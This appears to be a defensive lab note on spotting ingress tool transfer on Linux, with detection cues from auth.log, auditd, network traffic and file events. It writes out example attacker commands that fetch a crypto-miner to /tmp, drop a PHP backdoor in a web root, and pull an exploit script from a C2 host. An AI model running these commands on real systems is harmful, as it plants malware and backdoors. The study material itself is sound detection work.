[[MITRE ATT&CK]]

|Command|Usage Example|
|---|---|
|**Wget**: Download a file from the website|`wget https://github.com/xmrig/[...]/xmrig-x64.tar.gz -O /tmp/miner.tar.gz`|
|**Curl**: Make a request to the webpage|`curl --output /var/www/html/backdoor.php "https://pastebin.thm/yTg0Ah6a"`|
|**SSH**: Transfer a file via [SCP or SFTP](https://www.redhat.com/en/blog/secure-file-transfer-scp-sftp)|`scp kali@c2server:/home/kali/cve-2021-4034.sh /tmp/cve-2021-4034.sh`|

Like other process creation events, the commands above can be logged with auditd and sometimes appear in Bash history. However, there is a case where process logs aren't helpful. If the victim is reachable over SSH, an attacker can run **scp** or **sftp** from their own system. In this case, you won't see the command on the victim's auditd logs, but you will see a new SSH login! The same principle applies to other file transfer services such as FTP or SMB. Let's see an example:

```shell-session
# To detect on victim, look for SSH logins in /var/log/auth.log

attacker@attack-vm:~$ scp ./malware.sh ubuntu@thm-vm:/tmp[
OK] Connecting to thm-vm machine via SSH...
[OK] Logged in on thm-vm via SSH as "ubuntu"
[OK] File transferred from attack-vm to thm-vm
[OK] Job is done, logging out from thm-vm

# To detect on victim, look for "scp" command in Auditd logs
ubuntu@thm-vm:~$ scp attacker@attack-vm:./malware.sh /tmp
[OK] Connecting to attack-vm machine via SSH...
[OK] Logged in on attack-vm via SSH as "attacker"
[OK] File transferred from attack-vm to thm-vm
[OK] Job is done, logging out from attack-vm

```

## Additional Detection
**Network Traffic**

- A download from an IP previously seen in cyber attacks ([Virustotal example](https://www.virustotal.com/gui/ip-address/101.99.94.69/detection))
- A download from a suspicious or known malicious domain, such as `qfpkvwgq.thm`
- A download from a public service known to host attack tools, such as GitHub

**File Events**

- A newly-created file in the temporary folders, like `/tmp` or `/var/tmp`
- A newly-created file named like `exploit`, `shell.php`, or `kF1pBsY5`

**Antivirus alerts**

- EDR or antivirus alert triggering on a new malicious file or process